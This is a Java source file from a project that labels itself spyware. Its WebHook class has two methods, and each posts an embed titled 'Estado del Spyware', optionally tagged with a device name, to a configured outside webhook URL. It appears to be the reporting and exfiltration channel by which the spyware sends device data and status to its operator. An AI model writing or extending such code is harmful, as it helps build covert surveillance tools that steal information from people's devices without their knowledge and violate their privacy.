package com.gptinteractive.rabbit.network;

import com.gptinteractive.rabbit.api.DeviceInfo;
import com.gptinteractive.rabbit.data.Config;
import com.gptinteractive.rabbit.utils.WebhookUtils;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;


public class WebHook {

    public static Boolean sendWebhook(String message) {
        HttpURLConnection conn = null;
        JSONArray embends = new JSONArray();

        try {
            JSONObject embed = WebhookUtils.buildEmbed("Estado del Spyware", message, 5763719);
            embends.put(embed);
            String body = WebhookUtils.buildBody(embends);
            URL url = new URL(Config.getWebhookUrl());
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = body.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }
            int responseCode = conn.getResponseCode();
            if (responseCode == 200 || responseCode == 204) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }
    public static Boolean sendWebhook(String deviceName, String message) {
        HttpURLConnection conn = null;
        JSONArray embends = new JSONArray();

        try {
            JSONObject embed = WebhookUtils.buildEmbed("Estado del Spyware", message, 5763719);
            embends.put(embed);
            String body = WebhookUtils.buildBody(embends, deviceName);
            URL url = new URL(Config.getWebhookUrl());
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = body.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
                os.flush();
            }
            int responseCode = conn.getResponseCode();
            if (responseCode == 200 || responseCode == 204) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }
}
